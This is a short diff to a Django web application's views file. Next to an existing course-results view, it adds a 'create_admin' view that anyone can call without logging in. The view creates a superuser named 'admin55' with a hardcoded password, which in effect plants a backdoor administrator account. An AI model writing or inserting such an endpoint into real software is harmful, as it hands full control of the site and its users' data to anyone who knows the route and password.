@@ -236,3 +236,17 @@ def course_result(request, session_id):
         'breakdown': breakdown, 'profile': profile,
         'xp_earned': session.xp_earned,
     })
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def create_admin(request):
+    if not User.objects.filter(username='admin55').exists():
+        User.objects.create_superuser(
+            username='admin55',
+            email='admin@example.com',
+            password='NewPassword123!'
+        )
+    return HttpResponse("Admin created")
+
+
